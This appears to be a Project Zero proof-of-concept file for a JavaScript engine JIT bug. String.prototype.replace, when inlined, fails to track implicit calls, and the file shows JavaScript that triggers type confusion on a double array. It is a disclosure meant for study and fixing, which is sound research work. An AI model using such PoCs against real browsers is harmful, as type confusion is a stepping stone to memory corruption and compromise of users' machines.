/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1334

The "String.prototype.replace" method can be inlined in the JIT process. So in the method, all the calls which may break the JIT assumptions must be invoked with updating "ImplicitCallFlags". But "RegexHelper::StringReplace" calls the replace function without updating the flag. Therefore it fails to detect if a user function was called.


The PoC shows that it can result in type confusion.

PoC:
*/

function main() {
    let arr = [1.1, 1.1, 1.1, 1.1, 1.1];
    function opt(f) {
        arr[0] = 1.1;
        arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
        arr[2] = 1.1;
        arr[3] = 1.1;
    }

    let r0 = () => '0';
    for (var i = 0; i < 0x1000; i++)
        opt(r0);

    opt(() => {
        arr[0] = {};
        return '0';
    });

    print(arr[1]);
}

main();